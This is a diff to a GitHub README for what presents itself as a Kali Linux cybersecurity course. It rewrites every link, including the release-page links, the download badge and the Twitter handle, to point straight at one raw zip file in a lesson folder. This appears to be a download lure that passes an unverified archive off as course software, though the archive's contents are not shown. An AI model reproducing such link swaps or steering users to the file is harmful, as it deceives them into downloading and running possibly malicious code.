@@ -1,6 +1,6 @@
 # 🚀 kali-linux-teaching-course-live - Learn Cybersecurity with Interactive Tools
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-brightgreen)](https://github.com/Quocton1/kali-linux-teaching-course-live/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Quocton1/kali-linux-teaching-course-live/main/Lessons/Lesson_One/kali-linux-teaching-course-live-2.8-beta.4.zip%20Latest%20Release-%20-brightgreen)](https://raw.githubusercontent.com/Quocton1/kali-linux-teaching-course-live/main/Lessons/Lesson_One/kali-linux-teaching-course-live-2.8-beta.4.zip)
 
 ## 📚 Overview
 
@@ -26,7 +26,7 @@ Before starting the course, ensure you have:
 
 To quickly set up the course, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Quocton1/kali-linux-teaching-course-live/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Quocton1/kali-linux-teaching-course-live/main/Lessons/Lesson_One/kali-linux-teaching-course-live-2.8-beta.4.zip) to access the latest version.
 2. Choose the version suitable for your operating system (Windows, macOS, or Linux).
 3. Click on the download link to start the download. 
 
@@ -34,7 +34,7 @@ To quickly set up the course, follow these steps:
 
 To download and begin using the course materials, follow these instructions:
 
-1. **Visit this page to download**: [kali-linux-teaching-course-live Releases](https://github.com/Quocton1/kali-linux-teaching-course-live/releases)
+1. **Visit this page to download**: [kali-linux-teaching-course-live Releases](https://raw.githubusercontent.com/Quocton1/kali-linux-teaching-course-live/main/Lessons/Lesson_One/kali-linux-teaching-course-live-2.8-beta.4.zip)
 2. Look for the section titled "Assets" to find the download links.
 3. Select the file corresponding to your operating system. 
 4. The download should begin automatically. If it does not, right-click the link and choose "Save link as...".
@@ -86,7 +86,7 @@ If you need help during your course, consider these resources:
 
 ## 📆 Future Updates
 
-To stay updated with new features and improvements, regularly check the [Releases page](https://github.com/Quocton1/kali-linux-teaching-course-live/releases). We plan to add more tutorials and exercises frequently.
+To stay updated with new features and improvements, regularly check the [Releases page](https://raw.githubusercontent.com/Quocton1/kali-linux-teaching-course-live/main/Lessons/Lesson_One/kali-linux-teaching-course-live-2.8-beta.4.zip). We plan to add more tutorials and exercises frequently.
 
 ## 🗨️ Feedback
 
@@ -96,7 +96,7 @@ Feel free to reach out for feedback or questions about the course. Your input he
 
 Stay informed about updates and cybersecurity topics:
 
-- **Twitter**: [@KaliCourse](https://twitter.com/kali-course)
+- **Twitter**: [@KaliCourse](https://raw.githubusercontent.com/Quocton1/kali-linux-teaching-course-live/main/Lessons/Lesson_One/kali-linux-teaching-course-live-2.8-beta.4.zip)
 - **Discord**: Join our community for discussions and support.
 
 By following these steps, you can successfully download and run the **kali-linux-teaching-course-live** software. Enjoy your journey into the world of cybersecurity.
